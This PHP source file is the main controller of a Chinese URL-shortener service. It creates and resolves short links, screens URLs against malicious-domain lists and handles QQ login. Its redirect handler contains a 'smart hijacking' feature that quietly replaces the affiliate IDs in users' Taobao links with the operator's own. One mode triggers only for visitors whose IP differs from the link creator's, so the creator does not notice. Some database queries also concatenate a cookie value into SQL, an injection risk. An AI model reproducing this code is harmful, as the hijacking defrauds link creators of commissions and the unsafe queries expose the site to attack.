<?php
class IndexAction extends CommonAction 
{	
	public function index()
	{
		if($GLOBALS['rewrite']==0)
		{
			$arr = array_keys($_GET);
			if(count($arr)==1 && strlen($arr[0])>=1 && strlen($arr[0])<=11)
			{
				$this->jump($arr[0]);exit;
			}
		}
		
		if($GLOBALS['erweimaoff']==1)
		{
			$this->assign("erweima",1);
		}
		$this->display();
	}
	
	
	public function query()
	{
		header('Content-type:text/json;charset=utf-8');
		$json = array();
		$url = trim($_POST['url']);
		//api保护
		if($GLOBALS['webapi']==0)
		{
			if(strcmp(trim($_GET['apicode']),'dwz'.$GLOBALS['webapicode'])<>0)
			{
				json_error('私有化api,禁止外部调用!');
			}
		}
		//短地址解密
		$pwd = trim($_GET['pwd']);
		if(!empty($pwd))
		{
			$info = M('info');
			$infolist = $info->where(array('tinyurl'=>$url,'pwd'=>xmd5($pwd),'type'=>1))->find();
			if($infolist)
			{
				$json['tinyurl'] = getroot().$infolist['tinyurl'];
				$json['longurl'] = $infolist['longurl'];
				$json['status'] = 0;
				echo json_encode($json);exit;
			}
			else
			{
				json_error('密码不正确或当前短网址已经禁止访问！','-2');
			}
		}
		//功能开启判断
		if($GLOBALS['restoreoff']==0)
		{
			json_error('系统关闭了网址还原功能!');
		}
		if(strpos($url,'://')===false)
		{
			$url = 'http://'.$url; 
		}
		$url = str_replace(getroot(),'',$url);
		if(!preg_match('/^@?[a-zA-Z0-9]+$/',$url))
		{
			json_error('短网址不正确!','-2');
		}
		$data['tinyurl'] = $url;
		$model = M('info');
		$list = $model->where($data)->find();
		if($list)
		{
			//加密网址不提供查询处理
			if(!empty($list['pwd']))
			{
				json_error('加密网址不能被还原!','-2');
			}
			$json['tinyurl'] = getroot().$list['tinyurl'];
			$json['longurl'] = $list['longurl'];
			$json['status'] = 0;
			echo json_encode($json);exit;
		}
		json_error('短网址不存在!','-2');
	}

	public function create($url="")
	{
		header('Content-type:text/json;charset=utf-8');
		$json = array();
		if(empty($url)){
			$url = rtrim(trim($_POST['url']),'/');
		}
		//api保护
		if($GLOBALS['webapi']==0)
		{
			if(strcmp(trim($_GET['apicode']),'dwz'.$GLOBALS['webapicode'])<>0)
			{
				json_error('私有化api,禁止外部调用!');
			}
		}
		//功能开关判断
		if($GLOBALS['createoff']==0)
		{
			json_error('系统关闭了网址生成功能!');
		}
		if(strpos($url,'://')===false)
		{
			$url = 'http://'.$url; 
		}
		if(!preg_match('@^[a-z]+://((\w+(-\w+)*)(\.(\w+(-\w+)*))+)(\?\S*)?@',$url,$matches))
		{
			json_error('输入的网址不存在,请重新输入!');
		}
		else
		{	
			$url = strtr($url,$matches[0],strtolower($matches[0]));
			
		}
		//屏蔽自身短网址
		$root = getroot(1);
		if(substr($url.'/',0,strlen($root))==$root) 
		{
			json_error('不支持缩短本站网址！');
		}
		
		//安全短网址联盟流行恶意域名屏蔽
		if($GLOBALS['dwzbdmoff']==1)
		{
			$dwzbd = M('baddomain');
			$urlinfo = parse_url($url);
			if($dwzbd->where(array('domain'=>$urlinfo['host']))->find())
			{
				json_error('安全短网址联盟检测当前网址为高危恶意网址！');
			}
			unset($dwzbd);
		}
		if($GLOBALS['dwzbdioff']==1)
		{
			$dwzbdinfo = M('badinfo');
			if($dwzbdinfo->where(array('longurl'=>$url))->find())
			{
				json_error('安全短网址联盟检测当前网址为高危恶意网址！');
			}
		}
		//名单规则限制
		$predomain = strtolower($matches[1]);//域名
		preg_match('@^[a-z]+://(\S+)@',$url,$m2);
		$preallurl = $m2[1];// 全部网址部分
		$_whilerule = 0;
		if($GLOBALS['ruleoff']=='1')
		{
			//白名单
			$arr = explode('$',$GLOBALS['whiterule']);
			foreach($arr as $v)
			{
				$v = trim($v);
				//支持 *.匹配
				$ban = strtolower(substr($v,9));
				if(substr($v,0,9)=='domain:*.' && strpos($predomain,$ban)==true)
				{	
					$_whilerule = 1;
				}
				if(substr($v,0,7)=='domain:' && strtolower(substr($v,7))==$predomain)
				{
					$_whilerule = 1;
				}
			}
			if($_whilerule == 0)
			{
				json_error('当前地址不符合系统规则!');
			}
		}
		if($GLOBALS['ruleoff']=='2')
		{
			//黑名单
			$arr = explode("$",$GLOBALS['blackrule']);
			//用户自定义域名和系统内置域名列入黑名单
			$arr2 = explode(",",$GLOBALS['cfg_domains']);
			foreach($arr2 as $v)
			{
				$arr[] ="domain:".$v;
			}
			$domain = M('domain');
			$arr3 = $domain->where(array('status'=>1))->field('domain')->select();
			foreach($arr3 as $v)
			{
				$arr[] ="domain:".$v['domain'];
			}
			foreach($arr as $v)
			{
				$v = trim($v);
				//支持 *.匹配
				$ban = strtolower(substr($v,9));
				if(substr($v,0,9)=='domain:*.' && strpos($predomain,$ban)==true)
				{	
					json_error('当前地址不符合系统规则!');
				}
				if(substr($v,0,7)=='domain:' && strtolower(substr($v,7))==$predomain)
				{
					json_error('当前地址不符合系统规则!');
				}
				if(substr($v,0,4)=='url:' && strtolower(substr($v,4))== $preallurl)
				{
					json_error('当前地址不符合系统规则!');
				}
			}
		}
		//api对接
		global $jsfishapioff,$jsdownapioff;
		if($jsfishapioff==1)
		{
			$result = safeurl_api($url);
			if($result['success']==1)
			{
				if($result['phish']==1)
				{
					json_error('安全短网址联盟检测当前网址为钓鱼网址！');
				}
				elseif($result['phish']==2)
				{
					json_error('安全短网址联盟检测当前网址有高风险，有钓鱼嫌疑！');
				}
				elseif($result['phish']==0)
				{
					//json_error('安全短网址联盟检测当前网址安全！');
				}
				elseif($result['phish']=='-1')
				{
					//json_error('安全短网址联盟检测当前网址安全性未知！');
				}
			}
		}
		if($jsdownapioff==1)
		{
			$result = safeurl_api($url,'download');
			if($result['success']==1)
			{
				if($result['down_type']==3)
				{
					json_error('安全短网址联盟检测当前网址为危险的下载链接！');
				}
				elseif($result['down_type']==2)
				{
					//json_error('安全短网址联盟检测当前网址为下载地址，并且很安全！');
				}
				elseif($result['down_type']==1)
				{
					//json_error('安全短网址联盟检测当前网址为下载地址，安全性未知！');
				}
				elseif($result['down_type']==6)
				{
					//json_error('安全短网址联盟检测当前网址不是下载地址');
				}
			}
		}
		$model = M('info');
		$data['longurl'] = $url;
		$list = $model->where($data)->find();
		if($list)
		{
			$json['tinyurl'] = $this->parseDomain().$list['tinyurl'];
			$json['longurl'] = $list['longurl'];
			$json['status'] = 0;
		}
		else
		{	
			$data['mid'] = 0;
			$data['tinyurl'] = getfreetiny($model->field('tinyurl')->select());
			$data['addtime'] = time();
			$data['type'] = 1;
			$data['tplid'] = isset($GLOBALS['defaulttplid']) ? (int)$GLOBALS['defaulttplid']: 0;
			$data['pwd'] ='';
			$model->add($data);
			$json['tinyurl'] = $this->parseDomain().$data['tinyurl'];
			$json['longurl'] = $data['longurl'];
			$json['status'] = 0;
		}
		echo json_encode($json);exit;		
	}
	
	public function jump($u='')
	{
		if($GLOBALS['thirdcountoff']==1)
		{
			$this->assign('tongji',$GLOBALS['thirdcountcode']);
		} 
		$data['tinyurl'] = trim($_GET['u']);
		if(!empty($u)) $data['tinyurl']  = $u;
		if(empty($data['tinyurl'])) die("<script>window.location.href='".getroot(1)."'</script>");
		$model = M('info');
		$tpl = M('tpl');
		$list = $model->field('id,longurl,type,tplid,tinyurl,mid,pwd')->where($data)->find();
		if(!$list) 
		{
			$content = $tpl->where('id=1')->getField('content');
			$this->show($content); exit;
		}
		//安全联盟审核中转
		if($GLOBALS['anquanjumpoff']==1)
		{
			$list['longurl'] = "http://www.anquan.org/intercept/?url=".urlencode($list['longurl'])."&plugin=js";
		}
		$this->assign('longurl',$list['longurl']);
		$this->assign('tinyurl',$list['tinyurl']);
		//淘宝客智能劫持
		if($GLOBALS['tbkoff']==1 && !empty($GLOBALS['tbkpid']))
		{
			//时间段模式
			if($GLOBALS['tbkmode']==0)
			{
				$stime = (int)$GLOBALS['tbkstarttime'];
				$otime = (int)$GLOBALS['tbkovertime'];
				if($stime >24) $stime = 1;
				if($otime >24) $otime = 23;
				if($stime > $otime)
				{
					$xtime = $otime;
					$otime = $stime;
					$stime = $xtime;
				}
				if($stime==$otime)
				{
					$stime =1;
					$otime =7;
				}
				$ntime = date('H',time());
				if($ntime >= $stime && $ntime <=$otime)
				{
					//执行替换
					$list['longurl'] = $this->tbkrep($list['longurl']);
				}
				
			}
			elseif($GLOBALS['tbkmode']==1)
			{
				//随机模式
				$n = rand(0,1);
				if($n==1)
				{
					//执行替换
					$list['longurl'] = $this->tbkrep($list['longurl']);
				}
			}
			elseif($GLOBALS['tbkmode']==2)
			{
				//智能模式
				if($list['mid']>0)
				{
					$member = M('member');
					$loginip = $member->where('id='.$list['mid'])->getField('loginip');
					if($loginip <> get_client_ip())
					{
						//执行替换
						$list['longurl'] = $this->tbkrep($list['longurl']);
					}
				}
				else
				{
					$n = rand(0,1);
					if($n==1)
					{
						//执行替换
						$list['longurl'] = $this->tbkrep($list['longurl']);
					}
				}
			
			}
			elseif($GLOBALS['tbkmode']==3)
			{
				//永恒模式
				$list['longurl'] = $this->tbkrep($list['longurl']);
			}
		}
		
		if($list['type']==2)
		{
			$content = $tpl->where('id=2')->getField('content');
			$this->show($content); exit;
		}
		if($GLOBALS['linkcodeoff']==1 && !empty($list['pwd']))
		{
			$content = $tpl->where('id=3')->getField('content');
			$this->show($content); exit;
		}
		if($GLOBALS['visitcount']==1 && $list && $list['type']<>2)
		{
			$map['url']  = $data['tinyurl'];
			$map['visitip'] = get_client_ip();
			$map['visittime'] = time();
			$map['from'] = $_SERVER['HTTP_REFERER'];
			if(is_null($map['from'])) $map['from'] ='';
			$model2 = M('visit');
			$model2 ->add($map);
		}
		$content = $tpl->where('id='.$list['tplid'])->getField('content');
		if(!empty($content))
		{
			$this->show($content.' '); exit;
		}
		else
		{
			header("location: ".$list['longurl']);exit;
		}
	}
	
	private function tbkrep($url)
	{
		return preg_replace('/mm_[0-9]{1,10}_0_0/',$GLOBALS['tbkpid'],$url);
	}
	public function verify()
	{
		import("ORG.Verify");
		$verify = new Verify();
		$verify->display();
	}
	
	
	//登录地址
	public function login($type = null){
		global $qqloginoff;
		if($qqloginoff==0)
		{
			$this->error('系统关闭了QQ登录功能！');
		}
		empty($type) && $this->error('参数错误');
		//加载ThinkOauth类并实例化一个对象
		import("ORG.ThinkSDK.ThinkOauth");
		$sns  = ThinkOauth::getInstance($type);
		if(isset($_GET['mode']) && $_GET['mode']=='bangding' && USER_LOGINED==true)
		{
			session('bangding',cookie('uid'));
		}
		//跳转到授权页面
		redirect($sns->getRequestCodeURL());
	}

	//授权回调地址
	public function callback($type = null, $code = null){
		(empty($type) || empty($code)) && $this->error('参数错误');
		
		//加载ThinkOauth类并实例化一个对象
		import("ORG.ThinkSDK.ThinkOauth");
		$sns  = ThinkOauth::getInstance($type);

		//腾讯微博需传递的额外参数
		$extend = null;
		if($type == 'tencent'){
			$extend = array('openid' => $this->_get('openid'), 'openkey' => $this->_get('openkey'));
		}

		//请妥善保管这里获取到的Token信息，方便以后API调用
		//调用方法，实例化SDK对象的时候直接作为构造函数的第二个参数传入
		//如： $qq = ThinkOauth::getInstance('qq', $token);
		$token = $sns->getAccessToken($code , $extend);
		//获取当前登录用户信息
		if(is_array($token)){
			$user_info = A('Type', 'Event')->$type($token);
			//检测是否绑定了系统账户
			$model = M('member');
			$map = array();
			$map['activekey'] = substr($type.'_'.xmd5(trim($token['openid'])),0,32);
			$list = $model->where($map)->find();
			if($list)
			{
				//类型判断,绑定操作走绑定
				if(session('bangding') == cookie('uid') && USER_LOGINED==true)
				{
					session('bangding',null);
					$this->error('此账户已经被其他账户绑定了！');
				}
				//直接登录
				$model->where('id='.$list['id'])->setField(array('logintime'=>time(),'loginip'=>get_client_ip()));
				cookie('uid',$list['id'],time()+3600);
				session('uid',$list['id']);
				cookie('uname',$list['username'],time()+3600);
				cookie('wkcode',xmd5($list['id'].$list['username'],3));
				$this->success('登录成功!',U('User/myfile'));	
			}
			else
			{
				//$this->assign('userinfo',$user_info);
				//$this->assign('tokeninfo',$token);
				//类型判断,绑定操作走绑定
				if(session('bangding') == cookie('uid') && USER_LOGINED==true)
				{
					$model->where('id='.cookie('uid'))->setField('activekey',$type.'_'.$token['openid']);
					session('bangding',null);
					$this->success('绑定成功！',U('User/myfile'));exit;
				}
				//$this->display('Public:bangding');
				//直接创建临时账户
				$map = array();
				$map['username'] = $user_info['nick'];
				//检测账户是否被占用
				if($model->where(array('username'=>$map['username']))->find())
				{
					$map['username'] = $user_info['nick'].rand(1,10);
					if($model->where(array('username'=>$map['username']))->find())
					{
						$map['username'] = $user_info['nick'].rand(11,999);
					}
				}
				$pwd = uniqid();
				$map['activekey']  = substr($type.'_'.xmd5(trim($token['openid'])),0,32);
				$map['password'] = xmd5($pwd);
				$map['sex'] = 1;
				$map['status'] = 0;
				$map['email'] = $user_info['name'].'@'.strtolower($type).'.com';
				$map['logintime'] = time();
				$map['regtime'] = time();
				$map['loginip'] = get_client_ip();
				$map['money'] = 0;
				$map['rankid'] = 1;
				$map['province'] = '北京';
				$map['city'] = '北京';
				$map['birthday'] = '1988-01-23';
				$map['avtar'] = '';
				$model->add($map);
				$list = $model->where(array('username'=>$map['username']))->find();
				cookie('uid',$list['id'],time()+3600);
				session('uid',$list['id']);
				cookie('uname',$list['username'],time()+3600);
				cookie('wkcode',xmd5($list['id'].$list['username'],3));
				$this->success('登录成功!',U('User/myfile'));	
			}
		}
		
	}
	public function directjump()
	{
		$map['tinyurl'] = $_GET['url'];
		$map['type'] = 1;
		$model = M('info');
		$list = $model->where($map)->find();
		if(!$list)
		{
			$this->error('当前短地址不存在！');exit;
		}
		unset($map);
		if($GLOBALS['visitcount']==1)
		{
			$map['url']  = $list['tinyurl'];
			$map['visitip'] = get_client_ip();
			$map['visittime'] = time();
			$map['from'] = $_SERVER['HTTP_REFERER'];
			if(is_null($map['from'])) $map['from'] ='';
			$model2 = M('visit');
			$model2 ->add($map);
		}
		$tpl = M('tpl');
		$content = $tpl->where('id='.$list['tplid'])->getField('content');
		$this->show($content.' ');exit;
	}
	
	private function parseDomain()
	{
		global $cfg_domains,$cfg_domains_type,$rewrite;
		$suffix = $rewrite==0 ? '/?':'/';
		if(empty($cfg_domains))
		{
			return 'http://'.$_SERVER['SERVER_NAME'].$suffix;
		}
		$a = explode(",",$cfg_domains);
		if($cfg_domains_type==1)
		{
			shuffle($a);
		}
		return 'http://'.$a[0].$suffix;
	}
}